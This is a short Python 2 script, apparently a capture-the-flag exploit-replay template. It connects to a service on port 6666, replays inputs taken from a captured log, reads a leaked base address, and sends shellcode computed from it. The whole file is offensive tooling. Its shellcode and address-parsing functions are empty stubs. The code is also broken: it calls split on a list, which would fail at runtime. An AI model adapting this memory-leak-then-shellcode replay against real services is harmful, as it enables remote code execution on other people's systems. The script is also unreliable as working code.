#!/usr/bin/env python

from zio import *


def get_base(buf, pat): pass


def make_shellcode(line, base, offset): pass



filename = '6666->51132.105855.log'
ips = ['127.0.0.1']
port = 6666


if __name__ == '__main__':
    content = open(filename).readlines()
    tag = content[0].strip()
    offset = content[1].strip().split()
    buf = ''
    presc, basepat, scpat = content[2:].split('--------\n')
    for ip in ips:
        io = zio((ip, port), print_write=False, print_read=False)
        for item in presc:
            io.read_until_timeout(0.01)
            io.write(item)
        buf = io.read_until_timeout(0.05)        # read exposed base
        base = get_base(buf, basepat)
        for item in scpat:
            io.read_until_timeout(0.01)
            io.write(make_shellcode(item, base, offset))
        print io.read()
